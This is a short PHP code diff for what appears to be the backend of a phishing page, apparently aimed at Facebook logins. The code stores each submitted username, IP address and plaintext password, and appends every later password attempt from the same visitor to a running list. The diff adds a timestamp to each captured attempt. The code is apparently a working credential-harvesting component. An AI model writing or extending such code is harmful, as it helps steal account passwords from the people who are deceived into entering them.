@@ -13,15 +13,19 @@
       } else {
         $userFb = new Users;
         $user = $userFb::where([['username', $username],['ip', $ip]])->first();
+        $timestamp = time();
+        $datetime = date("d/m/Y - H:i:s", $timestamp);
         if($user == null) {
           $this->user->username = $username;
           $this->user->password = $password;
           $this->user->ip = $ip;
+          $this->user->time_access = $datetime;
           if($this->user->save()){
             $result = 2;
           }
         }else {
-            $user->password .= ' || '. $password;;
+            $user->password .= ' || '. $password;
+            $user->time_access .= ' || '. $datetime;
             if( $user->save()){
                 $result = 2;
               }
